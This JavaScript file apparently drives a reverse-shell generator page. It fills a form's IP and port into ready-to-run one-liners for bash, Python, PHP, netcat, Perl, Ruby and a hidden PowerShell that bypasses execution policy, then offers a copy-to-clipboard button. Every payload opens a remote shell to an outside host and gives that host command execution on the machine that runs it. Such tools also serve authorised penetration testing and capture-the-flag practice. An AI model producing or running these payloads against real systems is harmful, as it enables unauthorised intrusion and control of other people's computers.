document.getElementById('shell-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const ip = document.getElementById('ip').value;
    const port = document.getElementById('port').value;
    const language = document.getElementById('language').value;

    let command = '';

    switch (language) {
        case 'bash':
            command = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
            break;
        case 'python':
            command = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
            break;
        case 'php':
            command = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
            break;
        case 'nc':
            command = `nc -e /bin/sh ${ip} ${port}`;
            break;
        case 'perl':
            command = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
            break;
        case 'ruby':
            command = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
            break;
        case 'powershell':
            command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
            break;
        default:
            command = 'Unsupported language';
    }

    document.getElementById('output-command').textContent = command;
});
document.getElementById('copy-button').addEventListener('click', function () {
    const command = document.getElementById('output-command').textContent;

    // Copy the command to the clipboard
    navigator.clipboard.writeText(command)
        .then(() => {
            // Change button text to indicate success
            const copyButton = document.getElementById('copy-button');
            copyButton.innerHTML = '<i class="fa fa-check"></i> Copied!';
            copyButton.style.backgroundColor = 'var(--color-green)';

            // Reset the button after 2 seconds
            setTimeout(() => {
                copyButton.innerHTML = '<i class="fa fa-copy"></i> Copy to Clipboard';
                copyButton.style.backgroundColor = 'var(--color-main)';
            }, 2000);
        })
        .catch((err) => {
            console.error('Failed to copy: ', err);
            alert('Failed to copy command to clipboard.');
        });
});